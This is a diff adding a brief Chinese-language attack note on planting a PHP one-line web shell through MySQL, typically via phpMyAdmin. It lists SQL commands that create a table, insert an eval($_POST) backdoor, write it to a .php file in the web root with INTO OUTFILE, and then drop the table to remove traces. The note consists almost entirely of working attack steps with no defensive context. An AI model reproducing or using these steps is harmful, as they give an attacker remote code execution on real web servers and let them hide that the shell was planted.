@@ -1,0 +1,20 @@
+MySQL写一句话木马
+MySQL写木马，通常可以通过phpmyadmin来实现。
+
+前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。
+
+1、创建一个表
+
+CREATE TABLE a (cmd text NOT NULL);
+
+2、插入数据
+
+INSERT INTO a (cmd) VALUES('<?php eval($_POST['password']);?>');
+
+3、导出一句话
+
+SELECT cmd from a into outfile '/var/www/tmp/webshell.php';
+
+4、删除表
+
+Drop TABLE IF EXISTS a;
